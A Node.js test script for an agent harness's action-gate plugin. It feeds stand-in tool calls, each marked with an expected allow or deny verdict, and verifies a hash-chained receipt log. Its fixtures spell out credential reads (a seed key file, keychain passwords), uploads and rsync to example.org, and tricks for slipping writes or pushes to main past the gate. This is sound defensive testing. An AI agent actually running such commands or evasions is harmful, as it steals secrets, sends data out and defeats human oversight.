#!/usr/bin/env node
/**
 * THE ACTION GATE, IN THE HARNESS'S OWN TOOL RUNTIME, WITH NO LIVE APP.
 *
 *   DSH_ROOT=<a built vendor/dsh> node plugins/aukora-action-gate/check.mjs
 *
 * It builds a Cordis context the way `vendor/dsh/packages/core/tools/tests/tools.spec.ts` does (Context +
 * SystemPrompt + the REAL `@deepseek-ai/dsh-tools` ToolRuntime), mounts this plugin through `ctx.plugin()` exactly as
 * the loader does, registers stand-in tools with the harness's real names and argument shapes (their bodies never
 * touch the disk: they only report that they ran), and executes calls through `ctx.tools.execute()` as the agent loop
 * does. Every path verdict comes from the vendored seed guard (vendor/aukora-seed-guard). Then it re-derives every
 * receipt's hash independently and checks that no raw argument reached the log.
 *
 * Everything it writes is inside one scratch root (scripts/lib/run-root.mjs `openScratch`), removed at exit. It reads
 * no key material: the one live key path it names is refused by the gate before any tool body could open it.
 */
import { createHash } from 'node:crypto'
import { existsSync, linkSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { createRequire } from 'node:module'
import { homedir, tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

import { canonicalJSON } from '../aukora-kira/lib/record.mjs'
import { openScratch } from '../../scripts/lib/run-root.mjs'
import * as gate from './lib/index.mjs'
import { createPolicy } from './lib/policy.mjs'

const HERE = dirname(fileURLToPath(import.meta.url))
const REPO = resolve(HERE, '..', '..')
const DSH = resolve(process.env.DSH_ROOT ?? join(REPO, 'vendor', 'dsh'))
if (!existsSync(join(DSH, 'packages', 'core', 'tools', 'lib', 'index.js'))) {
  process.stderr.write(`NOT RUN: no built DeepSeek Harness at ${DSH} (run scripts/build-dsh.py, or set DSH_ROOT)\n`)
  process.exit(2)
}
const need = createRequire(join(DSH, 'packages', 'core', 'tools', 'package.json'))
const load = async (specifier) => import(pathToFileURL(need.resolve(specifier)).href)
const { Context } = await load('@deepseek-ai/cordis')
const SystemPrompt = (await load('@deepseek-ai/dsh-system-prompt')).default
const tools = await import(pathToFileURL(join(DSH, 'packages', 'core', 'tools', 'lib', 'index.js')).href)

// ── A disposable deployment: a support root with a FIXTURE seed, a repository on `main`, and the receipt log. ──
const scratch = openScratch({ owner: 'aukora-action-gate-check', label: 'action-gate-check' })
const support = scratch.path('support')
const repo = scratch.path('repo')
const featureRepo = scratch.path('feature-repo')
const auraDir = join(support, 'state', 'home', 'aura-actions')
mkdirSync(join(support, 'state', 'aumlok'), { recursive: true })
writeFileSync(join(support, 'state', 'aumlok', 'machine-seed-v3.json'), '{"fixture":"not a key"}\n')
mkdirSync(join(repo, '.git'), { recursive: true })
writeFileSync(join(repo, '.git', 'HEAD'), 'ref: refs/heads/main\n')
mkdirSync(join(repo, 'plugins', 'aukora-action-gate', 'lib'), { recursive: true })
mkdirSync(join(repo, 'workspace'), { recursive: true })
mkdirSync(join(featureRepo, '.git'), { recursive: true })
writeFileSync(join(featureRepo, '.git', 'HEAD'), 'ref: refs/heads/feature/gate\n')
writeFileSync(join(repo, 'notes.txt'), 'hello\n')
writeFileSync(join(repo, 'original.txt'), 'one inode\n')
linkSync(join(repo, 'original.txt'), join(repo, 'second-name.txt'))

const ctx = new Context()
await ctx.plugin(SystemPrompt)
await ctx.plugin(tools.default)

// Stand-ins with the harness's names and argument shapes. A body only records that it ran.
const ran = []
const standIn = (toolName, parameters) => tools.defineTool({
  name: toolName,
  description: `stand-in for ${toolName}`,
  parameters,
  output: { schema: { type: 'string' }, render: (_args, value) => [{ type: 'text', text: value }] },
  async execute() { ran.push(toolName); return `${toolName} body ran` },
})
ctx.tools.register(standIn('read', { file_path: { type: 'string', required: true } }))
ctx.tools.register(standIn('write', { file_path: { type: 'string', required: true }, content: { type: 'string', required: true } }))
ctx.tools.register(standIn('bash', { command: { type: 'string', required: true }, description: { type: 'string', required: true }, workdir: { type: 'string' } }))
ctx.tools.register(standIn('web_fetch', { url: { type: 'string', required: true } }))
const unknownNames = ['write', 'edit', 'create', 'delete', 'move', 'put', 'save', 'read'].map(verb => `mcp__fixture__${verb}_file`)
for (const name of unknownNames) {
  ctx.tools.register(standIn(name, {
    path: { type: 'string' }, source: { type: 'string' }, destination: { type: 'string' },
  }))
}
ctx.tools.register(standIn('mcp__fixture__write', { uri: { type: 'string', required: true }, content: { type: 'string' } }))
ctx.tools.register(standIn('unapproved_fixture_tool', { note: { type: 'string' } }))

// THE MOUNT, as the loader performs it: the module namespace is the plugin (name, inject, apply).
// THE RED ARM: ACTION_GATE_CHECK_UNMOUNTED=1 runs the same calls with the row absent, and the check must go RED.
const unmounted = process.env.ACTION_GATE_CHECK_UNMOUNTED === '1'
if (!unmounted) await ctx.plugin(gate, {
  auraDir, supportRoot: support, repoRoots: [repo], defaultWorkspace: repo,
  // THE FIXTURE FAMILY IS DECLARED, because an undeclared name is now refused (#26). This is the same act a
  // deployment performs in overlays/action-gate.patch.yml, so the check exercises the real contract.
  allowTools: ['mcp__fixture__*'],
  extraWritableRoots: [tmpdir(), '/private/tmp'],
})

const agent = { id: 'session-check-0001', session: { header: { cwd: repo } } }
const liveSeed = join(homedir(), 'Library', 'Application Support', 'AUKORA', 'state', 'aumlok', 'machine-seed-v3.json')
const calls = [
  { expect: 'allow', name: 'read', arguments: { file_path: 'notes.txt' } },
  { expect: 'deny', name: 'read', arguments: { file_path: liveSeed } },
  { expect: 'deny', name: 'read', arguments: { file_path: join(support, 'state', 'aumlok', 'machine-seed-v3.json') } },
  { expect: 'deny', name: 'bash', arguments: { command: 'cat "$HOME/Library/Application Support/AUKORA/state/aumlok/machine-seed-v3.json"', description: 'Print the seed' } },
  { expect: 'deny', name: 'bash', arguments: { command: 'git push origin HEAD:main', description: 'Push to main' } },
  { expect: 'deny', name: 'bash', arguments: { command: 'git add -A && git commit -qm wip && git push', description: 'Commit and push the current branch (main)' } },
  { expect: 'allow', name: 'bash', arguments: { command: 'git status && git push origin feature/gate', description: 'Push a feature branch' } },
  { expect: 'deny', name: 'write', arguments: { file_path: 'plugins/aukora-action-gate/lib/policy.mjs', content: 'export {}' } },
  { expect: 'deny', name: 'write', arguments: { file_path: '/etc/aukora-gate-check', content: 'x' } },
  { expect: 'deny', name: 'write', arguments: { file_path: 'second-name.txt', content: 'x' } },
  { expect: 'deny', name: 'write', arguments: { file_path: join(REPO, 'vendor', 'aukora-seed-guard', 'src', 'guard.mjs'), content: 'x' } },
  { expect: 'deny', name: 'bash', arguments: { command: 'security find-generic-password -s github -w', description: 'Read a keychain item' } },
  { expect: 'deny', name: 'web_fetch', arguments: { url: 'https://example.org/upload' } },
  { expect: 'allow', name: 'web_fetch', arguments: { url: 'https://api.github.com/repos/x/y' } },
]
for (const call of calls) call.group = 'existing protections'

// All command strings below are inert input to stand-ins. No shell, interpreter or git command is launched.
const quoted = value => `'${String(value).replaceAll("'", "'\\''")}'`
const protectedTarget = 'plugins/aukora-action-gate/lib/policy.mjs'
const shellCall = (group, label, expect, command, workdir) => calls.push({
  group, label, expect, name: 'bash',
  arguments: { command, description: `Fixture: ${label}`, ...workdir === undefined ? {} : { workdir } },
})
const writers = [
  ['sed -i', path => `sed -i 's/hello/updated/' ${quoted(path)}`],
  ['sed -i empty suffix', path => `sed -i '' 's/hello/updated/' ${quoted(path)}`],
  ['redirect >', path => `printf x >${quoted(path)}`],
  ['redirect >>', path => `printf x >> ${quoted(path)}`],
  ['tee', path => `printf x | tee -a ${quoted(path)}`],
  ['cp', path => `cp notes.txt ${quoted(path)}`],
  ['mv', path => `mv notes.txt ${quoted(path)}`],
  ['install', path => `install -m 644 notes.txt ${quoted(path)}`],
  ['ditto', path => `ditto notes.txt ${quoted(path)}`],
  ['rsync', path => `rsync -a notes.txt ${quoted(path)}`],
  ['ln', path => `ln -s notes.txt ${quoted(path)}`],
  ['dd of=', path => `dd if=/dev/null of=${quoted(path)}`],
  ['truncate', path => `truncate -s 0 ${quoted(path)}`],
  ['python open', path => `python3 -c ${quoted(`open(${JSON.stringify(path)}, 'w').write('x')`)}`],
  ['python pathlib', path => `python3 -c ${quoted(`from pathlib import Path; Path(${JSON.stringify(path)}).write_text('x')`)}`],
  ['python pathlib open', path => `python3 -c ${quoted(`from pathlib import Path; Path(${JSON.stringify(path)}).open('w').write('x')`)}`],
  ['node writeFileSync', path => `node -e ${quoted(`require('node:fs').writeFileSync(${JSON.stringify(path)}, 'x')`)}`],
  ['node appendFileSync', path => `node -e ${quoted(`require('node:fs').appendFileSync(${JSON.stringify(path)}, 'x')`)}`],
]
for (const [label, command] of writers) {
  shellCall('protected literal shell targets', label, 'deny', command(protectedTarget))
  shellCall('workspace literal shell targets', label, 'allow', command('notes.txt'))
}
for (const [label, command] of writers.filter(([name]) => ['cp', 'mv', 'install', 'ditto', 'rsync', 'ln'].includes(name))) {
  shellCall('directory destinations', `${label} to .`, 'allow', command('.'))
  shellCall('directory destinations', `${label} to repo root`, 'allow', command(repo))
}
shellCall('directory destinations', 'cp preserves protected basename', 'deny', 'cp workspace/AGENTS.md .')
shellCall('directory destinations', 'ln preserves protected basename', 'deny', `ln -s workspace/AGENTS.md ${quoted(repo)}`)
shellCall('everyday shell syntax and temporary output', 'redirect to /dev/null', 'allow', 'printf x >/dev/null 2>&1')
shellCall('everyday shell syntax and temporary output', 'tee to /dev/null', 'allow', 'printf x | tee /dev/null')
shellCall('everyday shell syntax and temporary output', 'literal TMPDIR file', 'allow', `printf x >${quoted(join(tmpdir(), 'aukora-check-output.txt'))}`)
shellCall('everyday shell syntax and temporary output', 'TMPDIR variable remains unseen', 'allow', 'printf x >"$TMPDIR/aukora-check-output.txt"')
shellCall('everyday shell syntax and temporary output', '/private/tmp file', 'allow', 'printf x >/private/tmp/aukora-check-output.txt')
shellCall('everyday shell syntax and temporary output', 'quoted redirect is data', 'allow', `printf '%s' '> ${protectedTarget}'`)
shellCall('everyday shell syntax and temporary output', 'heredoc body is data', 'allow', `cat <<'EOF' >notes.txt\nprintf x >${protectedTarget}\nEOF`)
shellCall('protected literal shell targets', 'quoted metacharacters in filename', 'deny', `printf x >'plugins/example[1].mjs'`)
shellCall('protected literal shell targets', 'wrapped redirect', 'deny', `sh -c ${quoted(`printf x >${protectedTarget}`)}`)
shellCall('protected literal shell targets', 'command after heredoc', 'deny', `cat <<'EOF'\nexample\nEOF\nprintf x >${protectedTarget}`)
shellCall('protected literal shell targets', 'governing config', 'deny', `printf x >${quoted(join(support, 'config.json'))}`)
shellCall('protected literal shell targets', 'receipt log', 'deny', `printf x >>${quoted(join(auraDir, 'aura.jsonl'))}`)
shellCall('existing protections', 'rsync remote host', 'deny', 'rsync -a notes.txt example.org:notes.txt')
shellCall('everyday shell syntax and temporary output', 'read-only python open', 'allow', `python3 -c ${quoted(`open(${JSON.stringify(protectedTarget)}).read()`)}`)
shellCall('shell working directories', 'workdir protected target', 'deny', 'printf x >aukora-action-gate/lib/policy.mjs', join(repo, 'plugins'))
shellCall('shell working directories', 'cd protected target', 'deny', 'cd plugins && printf x >aukora-action-gate/lib/policy.mjs')
shellCall('shell working directories', 'workdir workspace target', 'allow', 'printf x >notes.txt', join(repo, 'workspace'))
shellCall('shell working directories', 'cd workspace target', 'allow', 'cd workspace && printf x >notes.txt')

for (const command of [
  'git -c push.default=matching push',
  'git -cpush.default=matching push',
  'git -c remote.origin.push=HEAD:main push origin',
  'git send-pack origin refs/heads/feature/gate',
  'git push --mirror origin',
  'git push --signed origin HEAD:main',
  'git push --repo origin HEAD:main',
  'git push origin refs/heads/*:refs/heads/*',
]) shellCall('unresolved git push forms', command, 'deny', command, featureRepo)
shellCall('everyday git', 'unrelated git config and explicit feature', 'allow', 'git -c color.ui=false push origin feature/gate', featureRepo)
shellCall('everyday git', 'explicit HEAD to feature', 'allow', 'git push origin HEAD:feature/gate', featureRepo)
calls.push(
  { group: 'existing protections', label: 'OpenViking root key', expect: 'deny', name: 'read', arguments: { file_path: join(support, 'state', 'home', 'openviking', 'root.key') } },
  { group: 'memory addresses', label: 'viking:// names no host', expect: 'allow', name: 'mcp__fixture__write', arguments: { uri: 'viking://user/owner/memories/x.md', content: 'x' } },
  { group: 'memory addresses', label: 'an unknown scheme is judged by its host', expect: 'deny', name: 'mcp__fixture__write', arguments: { uri: 'postgres://example.org/db', content: 'x' } },
)

for (const name of unknownNames.filter(name => !name.endsWith('__read_file'))) {
  for (const [expect, path] of [['deny', protectedTarget], ['allow', 'notes.txt']]) {
    calls.push({ group: 'unknown tools named as writes', label: `${name} ${expect}`, expect, name, arguments: { path } })
  }
}
calls.push(
  { group: 'unknown tool path roles', label: 'move source', expect: 'deny', name: 'mcp__fixture__move_file', arguments: { source: protectedTarget, destination: 'notes.txt' } },
  { group: 'unknown tool path roles', label: 'move destination', expect: 'deny', name: 'mcp__fixture__move_file', arguments: { source: 'notes.txt', destination: protectedTarget } },
  { group: 'unknown tool path roles', label: 'workspace move', expect: 'allow', name: 'mcp__fixture__move_file', arguments: { source: 'notes.txt', destination: 'workspace/result.txt' } },
  { group: 'unknown tool path roles', label: 'read governing file', expect: 'allow', name: 'mcp__fixture__read_file', arguments: { path: protectedTarget } },
  { group: 'unknown tool path roles', label: 'an unlisted tool', expect: 'deny', says: 'tool-not-approved', name: 'unapproved_fixture_tool', arguments: {} },
)

const signal = new AbortController().signal
let failures = 0
const seedPin = JSON.parse(readFileSync(join(REPO, 'vendor', 'aukora-seed-guard', 'PROVENANCE.json'), 'utf8'))
process.stdout.write(`DSH tool runtime: ${join(DSH, 'packages', 'core', 'tools')}\n`
  + `path judge:       vendor/aukora-seed-guard (${seedPin.repository} @ ${seedPin.commit.slice(0, 9)}, ${String(seedPin.files.length)} files pinned)\n`
  + `plugin mounted:   ${unmounted ? 'NONE (red arm: ACTION_GATE_CHECK_UNMOUNTED=1)' : `${gate.name} (inject ${JSON.stringify(gate.inject)})`}\n\n`)
const groups = new Map()
for (const [index, call] of calls.entries()) {
  const before = ran.length
  const result = await ctx.tools.execute({ callId: `call-${String(index + 1).padStart(2, '0')}`, name: call.name, arguments: call.arguments, agent, signal })
  const got = result.isError ? 'deny' : 'allow'
  const bodyRan = ran.length > before
  const ok = got === call.expect && bodyRan === (call.expect === 'allow') && (call.says === undefined || (result.content?.[0]?.text ?? '').includes(call.says))
  if (!ok) failures += 1
  const group = groups.get(call.group) ?? { total: 0, passed: 0 }
  group.total += 1
  if (ok) group.passed += 1
  groups.set(call.group, group)
  if (!ok && !unmounted) {
    const shown = call.name === 'bash' ? call.arguments.command : JSON.stringify(call.arguments)
    const text = result.content?.[0]?.text ?? ''
    process.stdout.write(`FAIL #${String(index + 1).padStart(2, '0')} ${call.group}: ${call.label ?? call.name}; expected ${call.expect}, got ${got}, body ${bodyRan ? 'ran' : 'did not run'}  ${shown}\n`)
    if (result.isError) process.stdout.write(`       ${text.length > 230 ? `${text.slice(0, 230)}...` : text}\n`)
  }
}
// `git -C ~/…` (the spelling AGENTS.md teaches) names the tree under home, not a `~` directory under a workspace on main.
// Judged by the policy directly, with the scratch root as home: a worktree off main may commit there.
const tildeVerdict = createPolicy(gate.readSettings({ auraDir, supportRoot: support, repoRoots: [repo], defaultWorkspace: repo,
  // THE FIXTURE FAMILY IS DECLARED, because an undeclared name is now refused (#26). This is the same act a
  // deployment performs in overlays/action-gate.patch.yml, so the check exercises the real contract.
  allowTools: ['mcp__fixture__*'], home: dirname(featureRepo) }))
  .judge({ tool: 'bash', args: { command: 'git -C ~/feature-repo commit -qm wip' }, workspace: repo })
const tildeOk = tildeVerdict.decision === 'allow'
if (!tildeOk) { failures += 1; process.stdout.write(`FAIL git -C ~/feature-repo commit; expected allow, got ${tildeVerdict.rule}\n`) }
groups.set('git -C ~/ names home', { total: 1, passed: tildeOk ? 1 : 0 })
for (const [name, group] of groups) process.stdout.write(`${group.passed === group.total ? 'OK  ' : 'FAIL'} ${name}: ${String(group.passed)}/${String(group.total)}\n`)

// ── THE RECEIPTS: every entry re-derived without the gate's code. ──
const logPath = join(auraDir, 'aura.jsonl')
const logText = existsSync(logPath) ? readFileSync(logPath, 'utf8') : ''
process.stdout.write(`\nreceipt log: ${join('<scratch>', 'support', 'state', 'home', 'aura-actions', 'aura.jsonl')}\n`)
const entries = logText === '' ? [] : logText.trimEnd().split('\n').map(line => JSON.parse(line))
let prev = 'aukora:aura-record:v1'
let chainOk = entries.length === calls.length
for (const [i, entry] of entries.entries()) {
  const { hash, prev: named, ...fields } = entry
  const recomputed = createHash('sha256').update(canonicalJSON({ prev: named, ...fields, domain: 'aukora:aura-record:v1' }), 'utf8').digest('hex')
  if (named !== prev || recomputed !== hash || entry.sequence !== i + 1) chainOk = false
  prev = hash
}
const leaked = ['HEAD:main', 'machine-seed', 'find-generic-password', 'example.org', 'notes.txt', 'export {}'].filter(raw => logText.includes(raw))
const decisions = entries.map(e => e.decision === (calls[e.sequence - 1]?.expect) ? 1 : 0).reduce((a, b) => a + b, 0)
process.stdout.write(`\nchain: ${String(entries.length)} entries, sequence 1..${String(entries.length)}, every prev/hash re-derived: ${chainOk ? 'INTACT' : 'BROKEN'}\n`)
process.stdout.write(`receipts match decisions: ${String(decisions)}/${String(calls.length)}\n`)
process.stdout.write(`raw arguments in the log: ${leaked.length === 0 ? 'none' : leaked.join(', ')}\n`)
if (!chainOk || leaked.length > 0 || decisions !== calls.length) failures += 1

process.stdout.write(`\n${failures === 0 ? 'ACTION GATE CHECK: GREEN' : `ACTION GATE CHECK: RED (${String(failures)} failure(s))`}\n`)
scratch.dispose()
process.exit(failures === 0 ? 0 : 1)
